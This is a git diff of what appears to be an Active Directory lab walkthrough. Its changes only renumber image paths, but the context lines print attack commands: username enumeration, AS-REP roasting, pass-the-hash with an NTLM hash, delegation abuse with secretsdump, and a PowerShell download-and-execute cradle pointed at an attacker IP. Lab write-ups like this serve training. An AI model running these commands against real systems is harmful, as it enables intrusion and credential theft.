@@ -24,7 +24,7 @@ git clone https://github.com/danielmiessler/SecLists
 ./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
 ```
 
-![](<../../../.gitbook/assets/image (72) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (72) (1) (1) (1) (1).png>)
 
 3\. Kerbrute found quite some valid usernames. To only get a list of usernames execute the following command which will cut the output and only print the usernames. Then it changes everything to lowercase and sort for unique entries and write it to `users.txt`:
 
@@ -66,7 +66,7 @@ Other attacks which are possible to do is password spraying or checking if the u
 GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
 ```
 
-![](<../../../.gitbook/assets/image (9) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1).png>)
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash for the user `richard`:
 
@@ -161,7 +161,7 @@ Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he does
 mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
 ```
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1).png>)
 
 ### 4. Become sysadmin
 
@@ -320,7 +320,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1) (1).png>)
 
 * Now we can paste the base64 encoded string in the following SQL query which will execute the base64 encoded PowerShell command:
 
@@ -351,7 +351,7 @@ One of the privilege escalation techniques that you don't see too often is by us
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
 
 2\. The `MachineAccountQouta` is 10, meaning we (all authenticated users) can create our own computerobjects in the domain. So lets add our own computerobject, this can be done with [PowerMad](https://github.com/Kevin-Robertson/Powermad). First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
@@ -458,7 +458,7 @@ As said before, we can use the local administrator hash with CrackMapExec and ex
 crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x whoami
 ```
 
-![](<../../../.gitbook/assets/image (72) (1).png>)
+![](<../../../.gitbook/assets/image (72) (1) (1).png>)
 
 That worked, but how can we get a shell? You remember the payload we generated to get a shell through SQL server. That will work here too. So lets copy that and place it in the x parameter after starting a listener again to receive the shell:
 
@@ -509,7 +509,7 @@ For this to work you will need to fill in the IP of your kali machine, which nee
 SELECT * FROM master..sysservers;
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
 
 3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server for the SQL server version with the following query, using the openquery functionality:
 
@@ -591,7 +591,7 @@ nslookup secure.local
 crackmapexec smb 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (64).png>)
+![](<../../../.gitbook/assets/image (64) (1).png>)
 
 3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:
 
@@ -603,7 +603,7 @@ bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sq
 
 We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
 
-![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1) (1) (1).png>)
 
 4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".
 
@@ -615,7 +615,7 @@ We see that the user has WriteOwner permissions:
 
 In BloodHound you can right click the Edge and click the ?Help function to get more information on how to abuse it:
 
-![](<../../../.gitbook/assets/image (13) (1) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1) (1).png>)
 
 5\. One tool to do these ACL abuses is [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from PowerSploit. So lets download that and load it into memory in the shell we have on `WEB01`.
 
@@ -751,7 +751,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-
 getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (71) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1).png>)
 
 Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
 
@@ -768,7 +768,7 @@ secretsdump.py -k -no-pass data01.secure.local
 crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc -x whoami
 ```
 
-![](<../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1).png>)
 
 17\. We could get a shell the same way as we did before.
 
@@ -834,7 +834,7 @@ net localgroup administrators sa_sql /add
 net localgroup "Remote Desktop Users" sa_sql /add
 ```
 
-![](<../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13) (1).png>)
 
 If we scan with Nmap now port 3389 is open:
 
